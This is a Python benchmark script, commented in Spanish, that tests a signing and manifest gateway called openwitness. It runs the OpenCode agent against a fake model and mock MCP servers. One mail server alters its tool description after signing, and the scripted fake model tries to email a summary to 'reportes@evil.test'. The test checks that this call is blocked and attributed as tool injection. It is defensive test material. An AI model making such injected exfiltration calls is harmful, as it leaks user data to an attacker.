"""G12 de punta a punta: OpenCode real + `owit exec` + plugin + manifiestos, con upstream `fake`. Dueña: Juliana.

    uv run python -m bench.opencode_probe [--out results] [--save-fixtures] [--cli /ruta/a/opencode]

Es el mismo escenario que `bench/claude_code_hooks_probe.py`, con otro agente:
- un gateway en un hilo, con el modelo falso y un `ManifestGate`;
- dos servidores MCP mínimos por stdio: `issues` (firmado y sin cambios) y `mail`, que cambia su descripción
  después de firmar (no envía nada);
- OpenCode lanzado con `owit exec`, que le inyecta la redirección del proveedor `anthropic` y el plugin.

Comprueba que el prompt llega firmado y con recibo, que `mail_send_email` no llega al modelo, y que si el
modelo la llama igual, el plugin la deniega y el servidor no la ejecuta. Todo en un directorio temporal, con
los directorios XDG apuntando ahí: no toca la configuración ni las sesiones de OpenCode del usuario.
"""
from __future__ import annotations

import argparse
import json
import os
import shutil
import sys
import tempfile
from pathlib import Path

from bench.claude_code_hooks_probe import ISSUES_OUT, LIST_ISSUES, MCP_SERVER, PROMPT, SEND_LIVE, SEND_SIGNED
from openwitness.identity import KeyPair, KeyRegistry
from openwitness.integrations.exec import agent_version, run_exec
from openwitness.ledger import load_records, verify_ledger
from openwitness.llm.base import LLMProfile
from openwitness.llm.fake import FakeUpstream
from openwitness.gateway.server import Gateway
from openwitness.manifests import ManifestGate, TrustStore, sign_manifest
from openwitness.serve import ServerThread

ROOT = Path(__file__).resolve().parents[1]
FIXTURES = ROOT / "tests" / "fixtures" / "opencode"
DESKTOP_CLI = "/opt/OpenCode/resources/opencode-cli"       # el CLI que trae la app de escritorio en Linux


def find_cli(explicit: str | None = None) -> str | None:
    for c in (explicit, shutil.which("opencode"), DESKTOP_CLI):
        if c and Path(c).exists():
            return c
    return None


def responder(body: dict) -> list[dict]:
    """Modelo falso: pide los issues, después insiste en la herramienta que el gateway quitó, y termina."""
    offered = {t.get("name") for t in body.get("tools") or []}
    if "issues_list_issues" not in offered:
        return [{"type": "text", "text": "Issues del proyecto demo"}]     # petición auxiliar (título)
    k = sum(1 for m in body.get("messages") or [] if m.get("role") == "assistant")
    if k == 0:
        return [{"type": "tool_use", "name": "issues_list_issues", "input": {"project": "demo"}}]
    if k == 1:
        return [{"type": "tool_use", "name": "mail_send_email",
                 "input": {"to": "reportes@evil.test", "body": "Resumen: el login falla."}}]
    return [{"type": "text", "text": "Hay un issue abierto (#12). No pude enviar el resumen: la herramienta fue bloqueada."}]


def _mcp_tool(t) -> dict:
    return {"name": t.name, "description": t.description, "inputSchema": t.input_schema}


def scrub(text: str, tmp: Path) -> str:
    for t in sorted({str(tmp), str(tmp.resolve())}, key=len, reverse=True):
        text = text.replace(t, "/tmp/owit-oc")
    return text.replace(str(Path.home()), "/home/user").replace(sys.executable, "python")


def main(argv: list[str] | None = None) -> dict:
    ap = argparse.ArgumentParser()
    ap.add_argument("--out", default=None, help="directorio donde escribir opencode.json")
    ap.add_argument("--cli", default=None, help="ruta del CLI de OpenCode")
    ap.add_argument("--save-fixtures", action="store_true", help="guardar las peticiones en tests/fixtures/opencode/")
    ap.add_argument("--keep", action="store_true", help="no borrar el directorio temporal")
    a = ap.parse_args(argv)
    cli = find_cli(a.cli)
    if not cli:
        raise SystemExit("OpenCode no está instalado (no se encontró `opencode` ni el CLI de la app de escritorio)")

    tmp = Path(tempfile.mkdtemp(prefix="owit-oc-"))
    work, data, owit_home, rec = tmp / "work", tmp / "data", tmp / "owit-home", tmp / "requests"
    work.mkdir()

    alice = KeyPair.generate()
    alice.save(tmp / "keys" / "alice.key")
    registry = KeyRegistry()
    registry.register("alice", alice.public_str())
    ts = TrustStore()
    for server, tools in (("issues", [LIST_ISSUES]), ("mail", [SEND_SIGNED])):
        pub = KeyPair.generate()
        ts.trust(server, pub.public_str())
        ts.add_manifest(sign_manifest(pub, server, "1.0.0", server, tools))

    # servidores MCP, con `codemode: false` para que sus herramientas vayan en `tools` (ver integrations/opencode)
    (tmp / "mcp_server.py").write_text(MCP_SERVER, encoding="utf-8")
    calls = tmp / "mcp_calls.jsonl"
    servers = {}
    for server, tools, outputs in (("issues", [LIST_ISSUES], {"list_issues": ISSUES_OUT}),
                                   ("mail", [SEND_LIVE], {"send_email": "enviado (simulado)"})):
        spec = tmp / f"{server}.json"
        spec.write_text(json.dumps({"name": server, "tools": [_mcp_tool(t) for t in tools], "outputs": outputs,
                                    "calls": str(calls)}, ensure_ascii=False), encoding="utf-8")
        servers[server] = {"type": "local", "command": [sys.executable, str(tmp / "mcp_server.py"), str(spec)],
                           "codemode": False}

    fake = FakeUpstream(LLMProfile("fake", "fake", model="fake-model"), responder=responder)
    gw = Gateway(data, KeyPair.generate(), registry, upstreams={"fake": fake}, default_upstream="fake",
                 gate=ManifestGate(ts), anchor_every=10, record_dir=rec)
    srv = ServerThread(gw.app()).start()
    version = agent_version([cli])
    env = {k: v for k, v in os.environ.items() if not k.startswith(("ANTHROPIC_", "OPENCODE_", "LMSTUDIO"))}
    env.update({"XDG_CONFIG_HOME": str(tmp / "xdg/config"), "XDG_DATA_HOME": str(tmp / "xdg/data"),
                "XDG_CACHE_HOME": str(tmp / "xdg/cache"), "XDG_STATE_HOME": str(tmp / "xdg/state"),
                "OPENCODE_DISABLE_AUTOUPDATE": "1", "OWIT_HOME": str(owit_home), "PWD": str(work),
                "OPENCODE_CONFIG_CONTENT": json.dumps({"mcp": {"servers": servers}}),
                "PYTHONPATH": os.pathsep.join([str(ROOT / "src"), str(ROOT)] + [p for p in sys.path if p])})
    cwd = os.getcwd()
    os.chdir(work)
    try:
        code = run_exec([cli, "run", "--auto", "--format", "json", PROMPT], "alice", tmp / "keys" / "alice.key",
                        srv.url, agent="opencode", env=env, version=version)
    finally:
        os.chdir(cwd)
        srv.stop()

    sid = next(iter(gw.sessions))
    receipts = [json.loads(f.read_text()) for f in sorted((owit_home / "receipts").glob("*.json"))] \
        if (owit_home / "receipts").exists() else []
    rep = verify_ledger(gw.ledger_path(sid), gw.blobs, gw.kp.public_str(), registry, gw.anchor, receipts)
    recs = load_records(gw.ledger_path(sid))
    unsigned: dict[str, int] = {}
    for r in recs:
        if r.kind == "user_text_unsigned":
            unsigned[r.meta["reason"]] = unsigned.get(r.meta["reason"], 0) + 1
    decisions = {r.meta["tool"]: f"{r.meta['decision']}:{r.meta['reason']}" for r in recs
                 if r.kind == "manifest_decision" and r.meta["origin"].startswith("mcp:")}
    builtin = sorted(r.meta["tool"] for r in recs if r.kind == "manifest_decision" and r.meta["reason"] == "builtin")
    mail_seen_by_model = any(
        "mail_send_email" in [t["name"] for t in json.loads(gw.blobs.get(r.entry["payload_hash"]))["tools"]]
        for r in recs if r.kind == "llm_request")
    executed = [json.loads(line)["name"] for line in calls.read_text().splitlines()] if calls.exists() else []
    result = {
        "opencode": version, "exit_code": code, "integrity_ok": rep.ok,
        "errors": [e.to_dict() for e in rep.errors][:5], "entries": len(recs),
        "signed_prompts": sum(r.kind == "user_prompt" for r in recs), "receipts": len(receipts),
        "unsigned_reasons": unsigned, "history_mismatch": gw.sessions[sid].stats.get("history_mismatch"),
        "mcp_decisions": decisions, "builtin_tools": builtin, "altered_tool_seen_by_model": mail_seen_by_model,
        "tool_calls": [{"tool": r.meta.get("tool"), "origin": r.meta.get("origin"), "anomaly": r.meta.get("anomaly")}
                       for r in recs if r.kind == "tool_call"],
        "tool_checks": [{"tool": r.meta.get("tool"), "decision": r.meta.get("decision")} for r in recs
                        if r.kind == "tool_check"],
        "tools_executed_by_mcp_servers": executed,
    }
    # atribución por reglas de cada acción (§7.9): el mismo veredicto debe salir con cualquier agente
    from openwitness.attribution import attribute
    result["attribution"] = []
    for r in recs:
        if r.kind == "tool_call":
            v = attribute(gw.ledger_path(sid), gw.blobs, r.seq, rep, records=recs)
            result["attribution"].append({"tool": r.meta.get("tool"), "label": v.label, "source": v.source,
                                          "partial": v.partial, "non_repudiable": v.non_repudiable,
                                          "arg_provenance": v.arg_provenance})
    result["ok"] = bool(
        rep.ok and result["signed_prompts"] >= 1 and result["receipts"] >= 1
        and not unsigned.get("no_hook") and not unsigned.get("no_match")
        and decisions.get("issues_list_issues") == "accepted:ok"
        and decisions.get("mail_send_email") == "rejected:descriptor_mismatch"
        and not mail_seen_by_model and "send_email" not in executed and "list_issues" in executed
        and {"tool": "mail_send_email", "decision": "deny"} in result["tool_checks"]
        # el mismo veredicto que con Claude Code: la acción la pidió alice, el destinatario lo puso mcp:issues
        and any(x["tool"] == "mail_send_email" and x["label"] == "TOOL_INJECTED" and x["source"] == "mcp:issues"
                and x["partial"] for x in result["attribution"]))
    print(json.dumps(result, indent=1, ensure_ascii=False))
    if a.out:
        out = Path(a.out)
        out.mkdir(parents=True, exist_ok=True)
        (out / "opencode.json").write_text(json.dumps(result, indent=1, ensure_ascii=False) + "\n", encoding="utf-8")
    if a.save_fixtures and rec.exists():
        dest = FIXTURES / version
        if dest.exists():
            shutil.rmtree(dest)
        dest.mkdir(parents=True)
        for f in sorted(rec.iterdir()):
            (dest / f.name.split("_", 2)[-1]).write_text(scrub(f.read_text(encoding="utf-8"), tmp), encoding="utf-8")
        (dest / "README.md").write_text(
            f"Peticiones reales de OpenCode {version} a través del gateway (upstream `fake`), grabadas con\n"
            "`python -m bench.opencode_probe --save-fixtures`. Rutas locales redactadas. Prompt firmado:\n"
            f"`{PROMPT}`\n", encoding="utf-8")
    if a.keep:
        print(f"directorio de trabajo: {tmp}", file=sys.stderr)
    else:
        shutil.rmtree(tmp, ignore_errors=True)
    return result


if __name__ == "__main__":
    main()
